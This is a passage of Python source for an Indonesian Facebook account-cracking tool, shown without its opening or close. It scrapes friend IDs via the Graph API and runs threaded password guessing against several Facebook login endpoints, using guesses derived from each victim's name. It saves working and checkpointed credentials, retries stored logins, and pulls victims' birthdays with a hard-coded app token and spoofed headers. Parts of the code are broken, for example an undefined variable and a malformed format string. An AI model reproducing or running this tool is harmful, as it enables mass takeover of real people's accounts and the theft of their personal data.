                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fii\n')
                                print("%s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("%s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print('%s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
    def tua_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2 = [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:
                        id2.append(y)
                        if len(id2) == 100:break
                    for a in id2:
                        q = a.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.tua_dev(url,cookie,token,False)
                else:
                    id3, id4 = [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id3.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id3:
                        id4.append(b)
                        if len(id4) == 100:break
                    for o in id4:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fii\n')
                                print(" %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("%s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print(' | ')
                print('s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
    def lanjut(self):
        print("%s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
        print(' | ')
        print(' %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        fii_xd()
##### PENGGANTI USER - UA
def userset():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] Ganti user agent")
    print(f"{P}[2] Cek user agent yang di gunakan")
    print(f"{P}[0] Kembali")
    print(f"{B} | ")
    _pil_=input(f"{P}[•] Pilih : {B}")
    if _pil_ in ["1","01"]:
        print(f"{B} | ")
        lololr=input(f"{P}[•] Masukan user agent \n{P}[•] Masukan di sini : {B}")
        try:
            open("ua","w").write(lololr)
            usera=open("ua","r").read()
        except Exception as e:
            print(f"{B} | ")
            print(f"{B} | ")
            print(f"{P}[•] Eror : {M}{e}")
        if usera == lololr:
            print(f"{B} | ")
            print(f"{B} | ")
            print(f"{P}[•] Sukses mengganti");menu()
        else:print(f"{P}[•]{M} Gagal mengganti user agent ");exit()
    
    elif _pil_ in ["2","02"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua=("Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
        print(f"{B} | ")
        print(f"{P}[•] User agent : {B}{_tes_ua}");menu()
    elif _pil_ in ["0","00"]:
        menu()
    else:print(f"{P}[•] Pilihan salah ");exit()

#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{B} | ")
        print(f"{M}[•] Akun terkena spam")
    if "c_user" in ses.cookies:
        print(f"{P}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            print(f"{B} | ")
            jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print(f"{P}[•]{M}>>>> {oh}")
    else:
        print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
def cek_hasil():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[•] Masukan file cp ")
    print(f"{P}[•] Contoh untuk masukan file : {B}CP/{tanggal}.json")
    print(f"{B} | ")
    files =input(f"{P}[•] Masukan nama file : {B}")
    try:
        buka_baju = open(files,'r').readlines()
    except FileNotFoundError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} File tidak di temukan");exit()
        time.sleep(2); cek_hasil()
    print(f"{B} | ")
    print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
    print(f"{B} | ")
    print(f"{B} | ")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        print(f"{B} | ")
        print(f"{P}[•] Akun facebook : {B}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print(f"{B} | ")
    print(f"{B} | ")
    input(f"{P}[•]{I} Chek akun sudah selesai")
    menu()

def cek_results():
    try:
        open("OK/%s.json"%(tanggal))
    except IOError:
        os.system("touch OK/%s.json"%(tanggal))
    try:
        open("CP/%s.json"%(tanggal))
    except IOError:
        os.system("touch CP/%s.json"%(tanggal))
    cp=("CP/%s.json"%(tanggal))
    ok=("OK/%s.json"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] Cek results cp")
    print(f"{P}[2] Cek results ok")
    print(f"{P}[0] Back")
    print(f"{B} | ")
    _pil3h=input(f"{P}[•] Pilih : {B}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B} | ")
            print(f"{P}[•]{M} Results cp{B}")
            os.system("cat CP/%s.json"%(tanggal))
        else:print(f"{M}[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print(f"{B} | ")
            print(f"{P}[•]{I} Results ok")
            os.system("cat OK/%s.json"%(tanggal))
        else:print(f"\n{P}[•]{M} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{P}[•]{M} Pilian tidak ada")


def fii_xd():
	kone()
	print(f"{B} | ")
	print(f"{B} | ")
	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
	if fiisayangwidiya in [""]:
		print(f"{B} | ")
		print(f"{P}[•]{M} Pilihan tidak boleh kosong");exit()
	elif fiisayangwidiya in ["1","01"]:
		print(f"{P}[•] Tampilan kan opsi akun chek point {B}Y/t")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B}").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, fii)
						exit()
				else:print(f"{P}[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()

		else:
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif fiisayangwidiya in ["3","03"]:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mobil, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mobill, uid, fii)
				exit()
				
	elif fiisayangwidiya in ["2","02"]:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mbasicc, uid, fii)
				exit()
				
def kone():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] B-api >>>> {B}Fast")
    print(f"{P}[2] Mbasic >>>> {B}Low")
    print(f"{P}[3] Mobile >>>> {B}Very low")

def started():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[•]{B} Results {I}ok {B}tersimpan di {I}ok/{tanggal}")
    print(f"{P}[•]{B} Results {K}cp {B}tersimpan di {K}cp/{tanggal}")
    print(f"{B} | ")
    print(f"{P}[•] Mode pesawat 5 detik jika tidak ada hasil")
    print(f"{B} | {P}")

def api(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie
    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
